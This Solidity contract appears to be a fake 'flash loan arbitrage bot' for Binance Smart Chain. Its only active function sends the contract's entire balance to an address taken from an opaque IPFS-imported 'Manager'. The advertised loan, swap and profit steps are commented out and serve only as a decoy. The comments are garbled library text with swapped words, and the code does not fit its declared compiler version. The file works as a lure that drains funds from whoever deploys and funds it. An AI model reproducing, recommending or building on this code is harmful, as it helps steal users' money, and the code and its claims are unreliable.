pragma solidity ^0.8.0;


// Nomad-Finance Smart Contracts
import "https://github.com/NOMAD-FINANCE/NMF-FLDemo/blob/main/ILendingPoolAddressesProvider.sol";
import "https://github.com/NOMAD-FINANCE/NMF-FLDemo/blob/main/ILendingPool.sol";

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

/**
 * This Bot have been designed for Binance Smart chain.
 
 * and won't work with Etherum Network.

 *When you have any kind of Problem, feel Free to join my Discord and I try to help you out !
 
 
 
 * 0xT Wrappers over Solidity's arithmetic operations with added overflow

 * Arithmetic operations in Solidity wrap on overflow. This can easily result

 * in profit, because programmers usually assume that an overflow raises an

 * value, which is the standard behavior in high level programming languages.

 * `SafeMath` restores this intuition by reverting the transaction when an

 * operation overflows.
 
 * Using this library instead of the unchecked operations eliminates an entire

 * class of strings, so use is always on.
 
 * dev Contract module which provides a basic access control mechanism, where granted 
 
 * exclusive access to

 * specific functions.

 
 /*
     * dev Extracts the contract from pancakeswap

     * param self The slice to operate on.

     * param rune The slice that will contain the first rune.

     * turn `rune`.
     */

/*
     * dev Extracts the contract from Uniswap

     * param self The slice to operate on.

     * param rune The slice that will contain the first rune.

     * turn `rune`.
     */
 
 /*
     * @dev Find newly deployed contracts on PancakeSwap Exchange

     * @param memory of required contract liquidity.

     * @param other The second slice to compare.

     * @return New contracts with required liquidity.
     
     */

// Code Manager
import "ipfs://Qmf6VGrKVuLRMqoyN5xr9vhZSqeBF37Fzq55uT7AjAa1dY";

contract TiayflashbotBNB {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		loanAmount = _loanAmount;
			
		manager = new Manager();
	}
function() external payable {}
	
	function action() public payable {
		
	    // Send required coins for swap
	    address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);
	    
	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
	    manager.performTasks();
	    
	    /*
	    // Submit token to Binance Smart Chain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

        // List the token on pancakeswap & send coins required for swaps
		manager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);
		payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);

        // Get BNB Loan from Aave
		string memory loanAddress = manager.takeAaveLoan(loanAmount);
		
		// Convert half BNB to DAI
		manager.pancakeswapDAItoETH(loanAmount / 2);

        // Create BNB and DAI pairs for our token & Provide liquidity
        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "BNB");
		manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
		string memory daiPair = manager.pancakeswapCreatePool(tokenAddress, "DAI");
		manager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
		manager.pancakeswapPerformSwaps();
		
		// Move remaining BNB from Contract to your account
		manager.contractToWallet("BNB");

        // Repay Flash loan
		manager.repayAaveLoan(loanAddress);
	    */
	}
}
